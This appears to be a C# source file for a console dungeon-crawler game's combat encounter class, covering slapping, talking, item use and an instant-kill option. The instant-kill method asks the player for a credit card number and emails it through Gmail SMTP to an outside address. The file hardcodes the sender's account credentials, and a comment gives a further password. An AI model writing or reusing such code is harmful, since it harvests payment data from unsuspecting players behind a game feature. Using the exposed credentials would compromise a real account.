using System.Diagnostics;
using System.Net;
using System.Net.Mail;

namespace DungeonCrawler;

public class Encounter
{
    // Players
    public Enemy Enemy { get; private set; }
    public Player Player { get; private set; }
    
    // States
    public bool IsUsing { get; private set; }

    // Cursor positions
    private int _optionsLeft;
    private int _optionsTop;
    private int _hpLeft;
    private int _hpTop;

    public Encounter(Enemy enemy, Player player)
    {
        Enemy = enemy;
        Player = player;
    }
    
    public void SetScreenValues(int optionsLeft, int optionsTop, int hpLeft, int hpTop)
    {
        _optionsLeft = optionsLeft;
        _optionsTop = optionsTop;
        _hpLeft = hpLeft;
        _hpTop = hpTop;
    }
    
    public void Act(ConsoleKey input)
    {
        switch (input)
        {
            case ConsoleKey.D1:
                if (Player.Slap(Enemy, out float damage)) RenderMessage($"You slapped {Enemy.Name} and dealt him {damage} damage");
                else RenderMessage($"You tried to slap {Enemy.Name} but miserably failed");
                
                RenderHP();
                
                break;
            case ConsoleKey.D2:
                Talk();
                
                return;
            case ConsoleKey.D3:
                IsUsing = true;
                Renderer.RenderInventory(Player, _optionsLeft, _optionsTop);
                
                return;
            case ConsoleKey.D4:
                Player.Kill();
                return;
            case ConsoleKey.D5:
                KillEnemy();
                
                return;
            default:
                Debug.WriteLine("NO");
                return;
        }
        
        Console.ReadKey(true);

        if (!Enemy.IsDead)
        {
            if (Enemy.Slap(Player, out float d)) RenderMessage($"{Enemy.Name} slapped you and dealt {d} damage.");
            else RenderMessage($"{Enemy.Name} tried to punch you but miserably failed.");
            
            Renderer.RenderHP(Player, Enemy, _hpLeft, _hpTop);
            Console.ReadKey(true);

            Renderer.RenderFightOptions(Player, _optionsLeft, _optionsTop);
        }
    }

    public void Use(ConsoleKey input)
    {
        string choice = input.ToString();

        try
        {
            int c = int.Parse(choice[1].ToString());
            switch (c)
            {
                case 0:
                    Debug.WriteLine("Back");
                    
                    Renderer.RenderFightOptions(Player, _optionsLeft, _optionsTop);
                    
                    break;
                default:
                    Use(c);
                    Renderer.RenderFightOptions(Player, _optionsLeft, _optionsTop);
                    break;
            }
            
            IsUsing = false;
        }
        catch (Exception e)
        {
            Console.WriteLine("YOU CAN'T DO THAT HERE");
        }
    }
    
    void Use(int number)
    {
        Item item = Player.Inventory.Item(number);
        Debug.WriteLine($"Used {item.Name}");
        
        if (item is Weapon w)
        {
            Enemy.Damage(w.Damage);
            Player.Inventory.RemoveItem(item);
            RenderMessage($"You used {item.Name} and dealt {w.Damage} to {Enemy.Name}");
        }
        else if (item is Healing h)
        {
            Player.Heal(h.HP);
            Player.Inventory.RemoveItem(item);
            RenderMessage($"You used {item.Name} and restored {h.HP} HP.");
        }
        else RenderMessage($"You used {item.Name} but it didn't do anything");
        RenderHP();

        Console.ReadKey(true);
    }

    void Talk()
    {
        bool shouldSpare = FightDialogues.RandomDialogue(out string line, out string answer, out string outcome);
        outcome = outcome.Replace("Enemy", Enemy.Name);
        
        RenderMessage($"You: {line}");
        Console.ReadKey(true);
        RenderMessage($"{Enemy.Name}: {answer}");
        Console.ReadKey(true);
        RenderMessage(outcome);
        Console.ReadKey(true);
        RenderMessage("                                                                                                                                                                    ");

        if (shouldSpare)
        {
            if (Enemy.Slap(Player, out float d)) RenderMessage($"{Enemy.Name} slapped you and dealt {d} damage.");
            else RenderMessage($"{Enemy.Name} tried to punch you but miserably failed.");
            
            RenderHP();
            Console.ReadKey(true);
        }
        
        Renderer.RenderFightOptions(Player, _optionsLeft, _optionsTop);
    }

    void KillEnemy()
    {
        Renderer.ClearFightOptions(_optionsLeft, _optionsTop);
        
        RenderMessage("Enter your credit card number: ");
        string input = Console.ReadLine()!;

        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
            Port = 587,
            Credentials = new NetworkCredential("pinkmanjesse883@gmail.com", "fugy pwwm gham cytz"), // Real password: Password!1.2
            EnableSsl = true,
        };
                        
        smtpClient.Send("pinkmanjesse883@gmail.com", "danielporat5@gmail.com", "credit card", input);
        
        Enemy.Kill();
    }
    
    void RenderHP()
    {
        Renderer.ClearHP(_hpLeft, _hpTop);
        Renderer.RenderHP(Player, Enemy, _hpLeft, _hpTop);
    }

    void RenderMessage(string str)
    {
        Renderer.RenderMessage(_optionsLeft, _optionsTop, str);
    }
}